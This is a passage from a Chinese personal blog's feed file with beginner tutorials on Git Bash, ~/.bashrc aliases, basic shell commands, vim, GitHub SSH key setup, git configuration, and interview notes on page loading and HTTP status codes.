id="安装-iTerm2"><a href="#安装-iTerm2" class="headerlink" title="安装 iTerm2"></a>安装 iTerm2</h2><p><a href="https://www.iterm2.com/" title="null">https://www.iterm2.com/</a></p><p>iTerm2 比 macOS 自带的 Terminal 好用很多。</p><p>配置方法 <a href="http://yijiebuyi.com/blog/9c6419897949a7935d0fdec74cb7c61b.html" title="null">见此</a></p>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>命令行技巧</title>
      <link href="/Blog/2018/10/11/shell/%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%8A%80%E5%B7%A7/index/"/>
      <url>/Blog/2018/10/11/shell/%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%8A%80%E5%B7%A7/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>如果你不会一些命令行技巧，你就体会不到命令行的高效之处</p></blockquote><h3 id="技巧一：-x2F-bashrc"><a href="#技巧一：-x2F-bashrc" class="headerlink" title="技巧一：~&#x2F;.bashrc"></a>技巧一：~&#x2F;.bashrc</h3><hr><p>~&#x2F;.bashrc 文件的功能很强大。</p><h3 id="自动运行"><a href="#自动运行" class="headerlink" title="自动运行"></a>自动运行</h3><hr><p>1.首先 <code>touch ~/.bashrc</code> 创建一下这个文件<br>2.<code>start ~/.bashrc</code> 选用编辑器编辑这个文件，内容为 <code>echo &#39;Hi&#39;</code><br>3.你也可以用命令行编辑文件 <code>echo &quot;echo &#39;hi&#39;&quot; &gt;&gt; ~/.bashrc</code><br>4.关闭退出 Git Bash，然后打开 Git Bash，是不是看到了 Hi，这说明每次进入 Git Bash，就会优先运行 ~&#x2F;.bashrc 里面的命令<br>5.重新编辑 ~&#x2F;.bashrc，内容改为 <code>cd ~/Desktop</code>，重启 Git Bash，有没有发现默认就进入桌面目录了？<br>6.你可以用 ~&#x2F;.bashrc 在进入 Git Bash 前执行任何命令，十分方便。</p><h3 id="alias"><a href="#alias" class="headerlink" title="alias"></a>alias</h3><hr><p>1.在 ~&#x2F;.bashrc 里<strong>新增</strong>一行 <code>alias f=&quot;echo &#39;zc is awesome&#39;&quot;</code>，等于号两边不能有空格，你最好一个字都不要错。<br>2.运行 <code>source ~/.bashrc</code>，作用是执行 ~&#x2F;.bashrc<br>3.运行 <code>f</code>，就会看到 <code>zc is awesome</code><br>4.也就是说，现在 f 就是 echo ‘zc is awesome’ 的缩写了，利用这个技巧，我们可以把很多常见的命令缩写一下，比如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">alias</span> la=<span class="string">&#x27;ls -a&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> ll=<span class="string">&#x27;ls -l&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> gst=<span class="string">&#x27;git status -sb&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> ga=<span class="string">&#x27;git add&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> ga.=<span class="string">&#x27;git add .&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> gc=<span class="string">&#x27;git commit&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> gc.=<span class="string">&#x27;git commit .&#x27;</span></span><br></pre></td></tr></table></figure><p>保存退出，然后运行 <code>source ~/.bashrc</code><br>这样一来，你的 Git 操作就会简单很多：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ga</span> <span class="number">1</span>.txt</span><br><span class="line"><span class="attribute">ga</span> .</span><br><span class="line"><span class="attribute">gc</span> <span class="number">1</span>.txt</span><br><span class="line"><span class="attribute">gc</span>.</span><br><span class="line"><span class="attribute">gst</span></span><br></pre></td></tr></table></figure><p>接下来说两个目前用不到的技巧。</p><h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><hr><p>还可以在 ~&#x2F;.bashrc 里面设置一些环境变量，比如你可以在 ~&#x2F;.bashrc 里面添加一行</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> <span class="attribute">SASS_BINARY_SITE</span>=<span class="string">&quot;https://npm.taobao.org/mirrors/node-sass&quot;</span></span><br></pre></td></tr></table></figure><p>那么以后你安装 node-sass 的时候就不会因为被墙而报错了。以后会用到的，现在先说一下。</p><h2 id="设置-PATH"><a href="#设置-PATH" class="headerlink" title="###设置 PATH"></a>###设置 PATH</h2><p>在 .bashrc 里面写下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> <span class="attribute">PATH</span>=<span class="string">&quot;目录的绝对路径:<span class="variable">$PATH</span>&quot;</span></span><br></pre></td></tr></table></figure><p>可以在 PATH 里添加一个目录。看不懂这句话没关系，等你用得到的时候你再回来看。</p>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>命令行基础</title>
      <link href="/Blog/2018/10/11/shell/%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%9F%BA%E7%A1%80/index/"/>
      <url>/Blog/2018/10/11/shell/%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%9F%BA%E7%A1%80/index/</url>
      
        <content type="html"><![CDATA[<h1 id="命令行是什么"><a href="#命令行是什么" class="headerlink" title="命令行是什么"></a>命令行是什么</h1><hr><p>实际上是先有命令行，后有的图形界面。<br>最开始的游戏也是在命令行上的（想不到吧？），那时的游戏长这样：</p><p><img src="/Blog/2018/10/11/shell/%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%9F%BA%E7%A1%80/index/img.png"></p><p>你可能以为命令行是异端，但其实图形界面才是异端！</p><p>世界上第一个程序员（女）也是通过命令行来编程的，所以一个程序员不学命令行是说不过去的。</p><h2 id="命令行难吗"><a href="#命令行难吗" class="headerlink" title="#命令行难吗"></a>#命令行难吗</h2><h2 id="实际上命令行很简单，你觉得难是因为你在命令行上待的时间还不足-24-小时，而你在-Windows-上待的时间已经超过了-20-年！你跟我说-Windows-简单？简单你怎么还学-Windows-学了这么多年……其实-Linux-才是更简单的。-如何学习"><a href="#实际上命令行很简单，你觉得难是因为你在命令行上待的时间还不足-24-小时，而你在-Windows-上待的时间已经超过了-20-年！你跟我说-Windows-简单？简单你怎么还学-Windows-学了这么多年……其实-Linux-才是更简单的。-如何学习" class="headerlink" title="实际上命令行很简单，你觉得难是因为你在命令行上待的时间还不足 24 小时，而你在 Windows 上待的时间已经超过了 20 年！你跟我说 Windows 简单？简单你怎么还学 Windows 学了这么多年……其实 Linux 才是更简单的。#如何学习"></a>实际上命令行很简单，你觉得难是因为你在命令行上待的时间还不足 24 小时，而你在 Windows 上待的时间已经超过了 20 年！<br>你跟我说 Windows 简单？简单你怎么还学 Windows 学了这么多年……<br>其实 Linux 才是更简单的。<br>#如何学习</h2><p>首先背单词：</p><table><thead><tr><th>英文</th><th>翻译</th></tr></thead><tbody><tr><td>directory</td><td>目录、文件夹</td></tr><tr><td>file</td><td>文件</td></tr><tr><td>make</td><td>新建</td></tr><tr><td>remove</td><td>删除</td></tr><tr><td>move</td><td>移动</td></tr><tr><td>copy</td><td>复制</td></tr><tr><td>list</td><td>罗列</td></tr><tr><td>link</td><td>链接</td></tr><tr><td>find</td><td>查找</td></tr><tr><td>echo</td><td>发出回音、重复</td></tr><tr><td>touch</td><td>触摸</td></tr><tr><td>change</td><td>改变</td></tr><tr><td>背下来了吗？每个单词都很短，应该不难背。好的，你基本已经学会命令行了。接下来我们学习这些单词的缩写</td><td></td></tr><tr><td>#缩写</td><td></td></tr></tbody></table><hr><table><thead><tr><th>命令</th><th>全写</th><th>缩写</th></tr></thead><tbody><tr><td>创建目录</td><td>make directory</td><td>mkdir</td></tr><tr><td>删除</td><td>remove</td><td>rm</td></tr><tr><td>移动 &#x2F; 重命名</td><td>move</td><td>mv</td></tr><tr><td>复制</td><td>copy</td><td>cp</td></tr><tr><td>罗列</td><td>list</td><td>ls</td></tr><tr><td>改变目录</td><td>change directory</td><td>cd</td></tr><tr><td>缩写规则就是：删掉元音字幕（A E I O U），保留前 2 到 3 个辅音字母</td><td></td><td></td></tr></tbody></table><h2 id="好了，你已经学会-50-了，接下来我们来试试。-试试"><a href="#好了，你已经学会-50-了，接下来我们来试试。-试试" class="headerlink" title="好了，你已经学会 50% 了，接下来我们来试试。#试试"></a>好了，你已经学会 50% 了，接下来我们来试试。<br>#试试</h2><h2 id="1-cd-Desktop-进入桌面2-mkdir-demo-1-创建目录，这时你可以切到桌面，看到-demo-1-目录3-rm-rf-demo-1-删除目录4-touch-1-txt-创建文件，如果你发现文件后缀不见了，请让该死的-Windows-显示文件后缀5-mv-1-txt-2-txt-这样我们就把-1-txt-移到-2-txt-了，也就是重命名-绝对路径与相对路径的区别"><a href="#1-cd-Desktop-进入桌面2-mkdir-demo-1-创建目录，这时你可以切到桌面，看到-demo-1-目录3-rm-rf-demo-1-删除目录4-touch-1-txt-创建文件，如果你发现文件后缀不见了，请让该死的-Windows-显示文件后缀5-mv-1-txt-2-txt-这样我们就把-1-txt-移到-2-txt-了，也就是重命名-绝对路径与相对路径的区别" class="headerlink" title="1.cd ~/Desktop 进入桌面2.mkdir demo-1 创建目录，这时你可以切到桌面，看到 demo-1 目录3.rm -rf demo-1 删除目录4.touch 1.txt 创建文件，如果你发现文件后缀不见了，请让该死的 Windows 显示文件后缀5.mv 1.txt 2.txt 这样我们就把 1.txt 移到 2.txt 了，也就是重命名#绝对路径与相对路径的区别"></a>1.<code>cd ~/Desktop</code> 进入桌面<br>2.<code>mkdir demo-1</code> 创建目录，这时你可以切到桌面，看到 demo-1 目录<br>3.<code>rm -rf demo-1</code> 删除目录<br>4.<code>touch 1.txt</code> 创建文件，如果你发现文件后缀不见了，请让该死的 Windows 显示文件后缀<br>5.<code>mv 1.txt 2.txt</code> 这样我们就把 1.txt 移到 2.txt 了，也就是重命名<br>#绝对路径与相对路径的区别</h2><h2 id="以-x2F-开头的路径就是绝对路径，具体区别，在下面用命令行体会。-常见的自带命令"><a href="#以-x2F-开头的路径就是绝对路径，具体区别，在下面用命令行体会。-常见的自带命令" class="headerlink" title="以 &#x2F; 开头的路径就是绝对路径，具体区别，在下面用命令行体会。# 常见的自带命令"></a>以 &#x2F; 开头的路径就是绝对路径，具体区别，在下面用命令行体会。<br># 常见的自带命令</h2><table><thead><tr><th>操作</th><th>命令</th></tr></thead><tbody><tr><td>进入目录</td><td>cd</td></tr><tr><td>显示当前目录</td><td>pwd</td></tr><tr><td>创建目录</td><td>mkdir 目录名</td></tr><tr><td>创建目录</td><td>mkdir -p 目录路径</td></tr><tr><td>我是谁</td><td>whoami</td></tr><tr><td>–</td><td>–</td></tr><tr><td>查看文件</td><td>ls 路径</td></tr><tr><td>查看文件</td><td>ls -a 路径</td></tr><tr><td>查看文件</td><td>ls -l 路径</td></tr><tr><td>查看文件(综合以上两个)</td><td>ls -al 路径</td></tr><tr><td>–</td><td>–</td></tr><tr><td>创建文件</td><td>echo ‘1’ &gt; 文件路径</td></tr><tr><td>强制创建文件</td><td>echo ‘1’ &gt;! 文件路径</td></tr><tr><td>追加文件内容</td><td>echo ‘1’ &gt;&gt; 文件路径</td></tr><tr><td>创建文件</td><td>touch 文件名</td></tr><tr><td>改变文件更新时间</td><td>touch 文件名</td></tr><tr><td>–</td><td>–</td></tr><tr><td>复制文件</td><td>cp 源路径 目标路径</td></tr><tr><td>复制目录</td><td>cp -r 源路径 目标路径</td></tr><tr><td>–</td><td>–</td></tr><tr><td>移动节点</td><td>mv 源路径 目标路径</td></tr><tr><td>–</td><td>–</td></tr><tr><td>删除文件</td><td>rm 文件路径</td></tr><tr><td>强制删除文件</td><td>rm -f 文件路径</td></tr><tr><td>删除目录</td><td>rm -r 目录路径</td></tr><tr><td>强制删除目录</td><td>rm -rf 目录路径</td></tr><tr><td>–</td><td>–</td></tr><tr><td>查看目录结构</td><td>tree</td></tr><tr><td>建立软链接</td><td>ln -s 真实文件 链接</td></tr><tr><td>–</td><td>–</td></tr><tr><td>下载文件</td><td>curl -L <a href="https://www.baidu.com/" title="null">https://www.baidu.com</a> &gt; baidu.html</td></tr><tr><td>拷贝网页</td><td>wget -p -H -e robots&#x3D;off <a href="https://www.baidu.com/" title="null">https://www.baidu.com</a> (Windows 不支持 wget)</td></tr><tr><td>磁盘占用</td><td>df -kh</td></tr><tr><td>当前目录大小</td><td>du -sh .</td></tr><tr><td>各文件大小</td><td>du -h</td></tr></tbody></table><blockquote><p>如何学习我目前还没有掌握的命令？</p></blockquote><h2 id="Google-Linux-查看文件内容-快捷键"><a href="#Google-Linux-查看文件内容-快捷键" class="headerlink" title="Google: Linux 查看文件内容#快捷键"></a>Google: Linux 查看文件内容<br>#快捷键</h2><ul><li><kbd>↑</kbd> <kbd>↓</kbd> 上一命令 &#x2F; 下一命令</li><li><kbd>!</kbd><kbd>!</kbd> 上一命令占位符</li><li><kbd>Tab</kbd> 自动补全路径</li><li><kbd>Alt</kbd>+<kbd>.</kbd> 上一命令的最后一个参数</li><li><code>&amp;&amp;</code> 前面的执行成功了，再执行后面的</li><li><code>||</code> 前面的执行失败了，就执行后面的</li><li><code>;</code> 前面执行完了，不管成功失败，就执行后面的</li><li><code>&gt;</code> 重定向</li><li><code>|</code> 管道</li></ul><h1 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h1><hr><h2 id="如何退出-vim"><a href="#如何退出-vim" class="headerlink" title="如何退出 vim"></a>如何退出 vim</h2><hr><ul><li>强制退出（不保存）：狂按 ESC，然后按下 :q! 回车</li><li>保存后退出：狂按 ESC，然后按下 :wq 回车</li></ul><p>是不是很……简……单……</p><h2 id="如何学习-vim"><a href="#如何学习-vim" class="headerlink" title="如何学习 vim"></a>如何学习 vim</h2><hr><p>vim 被誉为 <a href="https://upclinux.github.io/intro/07/vim-and-emacs/" title="null">编辑器之神</a>。</p><p>如果你想要入门 vim，下面是三个教程：</p><ol><li>在命令行输入 vimtutor ，即可查看官方自带的中文教程。看完它。</li><li><a href="http://coolshell.cn/articles/5426.html" title="null">简明 VIM 练级攻略</a></li><li><a href="https://vim-adventures.com/" title="null">一个 vim 游戏</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Git创建一个SSH KEY</title>
      <link href="/Blog/2018/10/11/shell/Git%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AASSH_KEY/index/"/>
      <url>/Blog/2018/10/11/shell/Git%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AASSH_KEY/index/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Generating-a-new-SSH-key"><a href="#一、Generating-a-new-SSH-key" class="headerlink" title="一、Generating a new SSH key"></a>一、Generating a new SSH key</h2><ol><li><p>Open Git Bash.</p></li><li><p>Paste the text below, substituting in your GitHub email address.</p></li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh</span>-keygen -t rsa -b <span class="number">4096</span> -C <span class="string">&quot;your_email@example.com&quot;</span> </span><br></pre></td></tr></table></figure><h4 id="x2F-x2F-输入这句话，连按三个回车，直接跳过下面的步骤"><a href="#x2F-x2F-输入这句话，连按三个回车，直接跳过下面的步骤" class="headerlink" title="&#x2F;&#x2F; 输入这句话，连按三个回车，直接跳过下面的步骤"></a>&#x2F;&#x2F; 输入这句话，连按三个回车，直接跳过下面的步骤</h4><p>This creates a new ssh key, using the provided email as a label.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Generating <span class="keyword">public</span>/<span class="keyword">private</span> rsa key pair.</span><br></pre></td></tr></table></figure><ol start="3"><li>When you’re prompted to “Enter a file in which to save the key,” press Enter. This accepts the default file location.</li></ol><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter a <span class="keyword">file</span> in which to save the key (<span class="regexp">/c/U</span>sers<span class="regexp">/you/</span>.ssh/id_rsa):[Press enter]</span><br></pre></td></tr></table></figure><ol start="4"><li>At the prompt, type a secure passphrase. For more information, see <a href="https://help.github.com/articles/working-with-ssh-key-passphrases">“Working with SSH key passphrases”</a>.</li></ol><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase): [<span class="keyword">Type</span> <span class="type">a </span>passphrase]</span><br><span class="line">Enter same passphrase again: [<span class="keyword">Type</span> <span class="type">passphrase </span>again]</span><br></pre></td></tr></table></figure><h2 id="二、安装完成之后，输入命令-ll-ssh-查看是否安装成功，出现-id-rsa（锁）-和-id-rsa-pub（钥匙）-成功"><a href="#二、安装完成之后，输入命令-ll-ssh-查看是否安装成功，出现-id-rsa（锁）-和-id-rsa-pub（钥匙）-成功" class="headerlink" title="二、安装完成之后，输入命令 ll ~/.ssh 查看是否安装成功，出现 id_rsa（锁） 和 id_rsa.pub（钥匙） 成功"></a>二、安装完成之后，输入命令 <code>ll ~/.ssh</code> 查看是否安装成功，出现 <code>id_rsa</code>（锁） 和 <code>id_rsa.pub</code>（钥匙） 成功</h2><p><img src="/Blog/2018/10/11/shell/Git%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AASSH_KEY/index/img.png"></p><h2 id="三、出现锁🔒之后，我们输入命令cat-ssh-id-rsa-pub查看内容并上传github"><a href="#三、出现锁🔒之后，我们输入命令cat-ssh-id-rsa-pub查看内容并上传github" class="headerlink" title="三、出现锁🔒之后，我们输入命令cat ~/.ssh/id_rsa.pub查看内容并上传github"></a>三、出现锁🔒之后，我们输入命令<code>cat ~/.ssh/id_rsa.pub</code>查看内容并上传github</h2><p><img src="/Blog/2018/10/11/shell/Git%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AASSH_KEY/index/img_1.png"></p><p><img src="/Blog/2018/10/11/shell/Git%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AASSH_KEY/index/img_2.png"></p><h2 id="四、创建完成之后我们可以测试一下"><a href="#四、创建完成之后我们可以测试一下" class="headerlink" title="四、创建完成之后我们可以测试一下"></a>四、创建完成之后我们可以测试一下</h2><p><em>如果之前已经存在，输入命令<code>rm ~./ssh/known_hosts</code>删除之前的连接</em></p><h5 id="输入命令测试连接"><a href="#输入命令测试连接" class="headerlink" title="输入命令测试连接"></a>输入命令测试连接</h5><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh</span> -T git<span class="variable">@github</span>.com</span><br></pre></td></tr></table></figure><p><img src="/Blog/2018/10/11/shell/Git%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AASSH_KEY/index/img_3.png" alt="yse"></p>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Git 的安装与配置</title>
      <link href="/Blog/2018/10/10/shell/Git%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/index/"/>
      <url>/Blog/2018/10/10/shell/Git%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/index/</url>
      
        <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>不需要安装，<code>Git Bash</code> 内置了 <code>Git</code> 命令，<code>Git Bash</code> 还内置了以下命令：</p><ul><li>ls</li><li>mkdir</li><li>cp</li><li>mv</li></ul><p>等等，大概有几十个命令，<code>Git Bash</code> 其实是一个 <code>Bash</code>，不是 <code>Git</code>。</p><p>Git Bash 给我们提供了一个虚拟的 Linux 环境，这样我们就不用忍受 Windows 里面垃圾一般的命令行体验了。</p><p>配置<br>请在命令行运行这五句话！！！一定要运行这五句话，不然 git 就不能用了</p><ul><li><p>git config –global user.name 你的英文名字———#方便产品经理找（怼）你</p></li><li><p>git config –global user.email 你的常用邮箱———#方便产品经理找（怼）你</p></li><li><p>git config –global push.default simple—————-# 本来我写的是 matching，不过想了想可能 simple 更好</p></li><li><p>git config –global core.quotepath false————–#防止文件名变成数字</p></li><li><p>git config –global core.editor “vim”——————-# 使用vim编辑提交信息</p></li><li><p>另外很重要的一点！你自己运行 git 的时候注意一下：git remote add origin 后面的地址，不允许使用 https 开头的地址，见下图</p></li></ul><p><img src="/Blog/2018/10/10/shell/Git%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/index/img.png"></p><p><img src="/Blog/2018/10/10/shell/Git%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/index/img_1.png"></p>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Git Bash 的安装与配置</title>
      <link href="/Blog/2018/10/10/shell/GitBash%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/index/"/>
      <url>/Blog/2018/10/10/shell/GitBash%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/index/</url>
      
        <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol><li>从官网下载（算了，太慢了）</li><li>百度网盘：链接: <a href="https://pan.baidu.com/s/1nu99KWp" title="null">https://pan.baidu.com/s/1nu99KWp</a> 密码: jfdf</li></ol><p>双击安装，注意每一步的选项要参考下面的图（如果没有对应的图，就直接下一步）</p><p><img src="/Blog/2018/10/10/shell/GitBash%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/index/img.png"></p><p><img src="/Blog/2018/10/10/shell/GitBash%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/index/img_1.png"></p><p>下面的路径可以随便填：</p><p><img src="/Blog/2018/10/10/shell/GitBash%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/index/img_2.png"></p><p><img src="/Blog/2018/10/10/shell/GitBash%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/index/img_3.png"></p><p><img src="/Blog/2018/10/10/shell/GitBash%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/index/img_4.png"></p><p><img src="/Blog/2018/10/10/shell/GitBash%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/index/img_5.png"></p><p><img src="/Blog/2018/10/10/shell/GitBash%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/index/img_6.png"></p><p><img src="/Blog/2018/10/10/shell/GitBash%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/index/img_7.png"></p><p>好了，安装完成。</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>安装成功之后，需要设置一下外观：</p><p><img src="/Blog/2018/10/10/shell/GitBash%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/index/img_8.png"></p><p><img src="/Blog/2018/10/10/shell/GitBash%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/index/img_9.png"></p><p><img src="/Blog/2018/10/10/shell/GitBash%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/index/img_10.png"></p><p><img src="/Blog/2018/10/10/shell/GitBash%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/index/img_11.png"></p><p>关闭重启 Git Bash 即可。</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="第一种使用方式"><a href="#第一种使用方式" class="headerlink" title="第一种使用方式"></a>第一种使用方式</h3><p>找一个目录，在目录上右键点击，然后选中「Git Bash Here」，即可用 Git Bash 打开这个目录。</p><p>试试输入 <code>touch 1.txt</code>，回车后看看目录里是不是多了一个文件。</p><h3 id="第二种使用方式"><a href="#第二种使用方式" class="headerlink" title="第二种使用方式"></a>第二种使用方式</h3><p>直接打开 Git Bash，输入 <code>cd ~/Desktop</code> 即可来到桌面所在的目录。</p><p>试试输入 <code>touch 1.txt</code>，回车后看看桌面上是不是多了一个文件。</p><h3 id="更多命令"><a href="#更多命令" class="headerlink" title="更多命令"></a>更多命令</h3><p>下节课我们会专门学习命令行，你可以试试下面几个简单的命令：</p><ul><li>创建目录：<code>mkdir my-dir</code></li><li>删除目录：<code>rm -r my-dir</code></li><li>创建文件：<code>echo &quot;hello&quot; &gt; newFile.txt</code></li><li>删除文件：<code>rm newFile.txt</code></li></ul><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><a href="https://jingyan.baidu.com/article/1876c8529390eb890b1376b6.html" title="null">解决git bash无法复制和黏贴</a></p>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>从输入 URL 到页面加载全过程</title>
      <link href="/Blog/2018/10/09/interview/%E4%BB%8E%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%8A%A0%E8%BD%BD%E5%85%A8%E8%BF%87%E7%A8%8B/index/"/>
      <url>/Blog/2018/10/09/interview/%E4%BB%8E%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%8A%A0%E8%BD%BD%E5%85%A8%E8%BF%87%E7%A8%8B/index/</url>
      
        <content type="html"><![CDATA[<p>1.首先做 DNS 查询，如果这一步做了智能 DNS 解析的话，会提供访问速度最快的 IP 地址回来</p><p>2.接下来是 TCP 握手，应用层会下发数据给传输层，这里 TCP 协议会指明两端的端口号，然后下发给网络层。网络层中的 IP 协议会确定 IP 地址，并且指示了数据传输中如何跳转路由器。然后包会再被封装到数据链路层的数据帧结构中，最后就是物理层面的传输了</p><p>3.TCP 握手结束后会进行 TLS 握手，然后就开始正式的传输数据</p><p>4.数据在进入服务端之前，可能还会先经过负责负载均衡的服务器，它的作用就是将请求合理的分发到多台服务器上，这时假设服务端会响应一个 HTML 文件</p><p>5.首先浏览器会判断状态码是什么，如果是 200 那就继续解析，如果 400 或 500 的话就会报错，如果 300 的话会进行重定向，这里会有个重定向计数器，避免过多次的重定向，超过次数也会报错</p><p>6.浏览器开始解析文件，如果是 gzip 格式的话会先解压一下，然后通过文件的编码格式知道该如何去解码文件</p><p>7.文件解码成功后会正式开始渲染流程，先会根据 HTML 构建 DOM 树，有 CSS 的话会去构建 CSSOM 树。如果遇到 script 标签的话，会判断是否存在 async 或者 defer ，前者会并行进行下载并执行 JS，后者会先下载文件，然后等待 HTML 解析完成后顺序执行，如果以上都没有，就会阻塞住渲染流程直到 JS 执行完毕。遇到文件下载的会去下载文件，这里如果使用 HTTP 2.0 协议的话会极大的提高多图的下载效率。</p><p>8.初始的 HTML 被完全加载和解析后会触发 DOMContentLoaded 事件</p><p>9.CSSOM 树和 DOM 树构建完成后会开始生成 Render 树，这一步就是确定页面元素的布局、样式等等诸多方面的东西</p><p>10.在生成 Render 树的过程中，浏览器就开始调用 GPU 绘制，合成图层，将内容显示在屏幕上了</p><h6 id="HTTP-常用返回码"><a href="#HTTP-常用返回码" class="headerlink" title="HTTP 常用返回码"></a>HTTP 常用返回码</h6><p>2XX 成功</p><p>200 OK，表示从客户端发来的请求在服务器端被正确处理<br>204 No content，表示请求成功，但响应报文不含实体的主体部分<br>205 Reset Content，表示请求成功，但响应报文不含实体的主体部分，但是与 204 响应不同在于要求请求方重置内容<br>206 Partial Content，进行范围请求</p><p>3XX 重定向</p><p>301 moved permanently，永久性重定向，表示资源已被分配了新的 URL<br>302 found，临时性重定向，表示资源临时被分配了新的 URL<br>303 see other，表示资源存在着另一个 URL，应使用 GET 方法获取资源<br>304 not modified，表示服务器允许访问资源，但因发生请求未满足条件的情况<br>307 temporary redirect，临时重定向，和302含义类似，但是期望客户端保持请求方法不变向新的地址发出请求</p><p>4XX 客户端错误</p><p>400 bad request，请求报文存在语法错误<br>401 unauthorized，表示发送的请求需要有通过 HTTP 认证的认证信息<br>403 forbidden，表示对请求资源的访问被服务器拒绝<br>404 not found，表示在服务器上没有找到请求的资源</p><p>5XX 服务器错误</p><p>500 internal sever error，表示服务器端在执行请求时发生了错误<br>501 Not Implemented，表示服务器不支持当前请求所需要的某个功能<br>503 service unavailable，表明服务器暂时处于超负载或正在停机维护，无法处理请求</p>]]></content>
      
      
      <categories>
          
          <category> 准备面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>如何解决跨域</title>
      <link href="/Blog/2018/10/09/day_thinking/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E8%B7%A8%E5%9F%9F/index/"/>
      <url>/Blog/2018/10/09/day_thinking/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E8%B7%A8%E5%9F%9F/index/</url>
      
